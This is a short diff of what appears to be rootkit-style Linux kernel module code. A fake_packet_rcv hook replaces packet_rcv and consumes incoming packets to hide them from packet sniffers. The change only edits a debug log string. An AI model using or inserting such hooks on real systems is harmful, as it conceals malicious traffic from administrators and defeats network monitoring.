@@ -19,7 +19,7 @@ struct hooked_function packet_rcv; //the struct of a hooked function
 
 int fake_packet_rcv(struct sk_buff *skb, struct net_device *dev,struct packet_type *pt, struct net_device *orig_dev)
 {
-	pr_info("im called! tpacket");
+	pr_info("im called! packet_rcv");
 	consume_skb(skb); // "hide" the packet
 	return 1;
 }
